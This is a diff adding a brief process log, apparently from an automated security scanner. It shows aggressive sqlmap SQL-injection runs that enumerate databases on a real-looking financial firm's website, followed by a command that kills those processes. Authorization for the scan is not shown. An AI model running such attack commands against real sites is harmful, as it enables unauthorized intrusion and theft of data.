@@ -1,0 +1,11 @@
+# command: cd "$WORK_PATH" 2>/dev/null || cd /work; ps -eo pid,etime,cmd | grep "sqlmap -u" | grep -v grep; echo "--- killing rest ---"; ps -eo pid,cmd | grep "sqlmap -u" | grep -v grep | awk '{print $1}' | xargs -r kill -9 2>/dev/null; sleep 2; ps -eo pid,cmd | grep "sqlmap -u" | grep -v grep | wc -l
+# tool: ps
+# exit_code: 0
+# ts: 2026-09-30T11:24:51.392453+00:00
+# ---
+
+ 246041       00:04 timeout 1500 sqlmap -u https://www.infinitycapital.bh/atom.xml?q=test&id=1 --batch --level=5 --risk=3 --dbs --threads=1 --delay=0.4 --timeout=15 --retries=1 --random-agent --output-dir=tool_outputs/sq_atom
+ 246042       00:04 /usr/bin/python3 /usr/bin/sqlmap -u https://www.infinitycapital.bh/atom.xml?q=test&id=1 --batch --level=5 --risk=3 --dbs --threads=1 --delay=0.4 --timeout=15 --retries=1 --random-agent --output-dir=tool_outputs/sq_atom
+ 246045       00:04 /usr/bin/python3 /usr/bin/sqlmap -u https://www.infinitycapital.bh/_next/image?url=http://images.ctfassets.net/x.jpg&w=1080&q=75 --batch --level=5 --risk=3 --threads=4 --dbs --headers=Accept: text/html,application/xhtml+xml|User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 --output-dir=/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/tool_outputs/sqlmap/out_img
+--- killing rest ---
+3
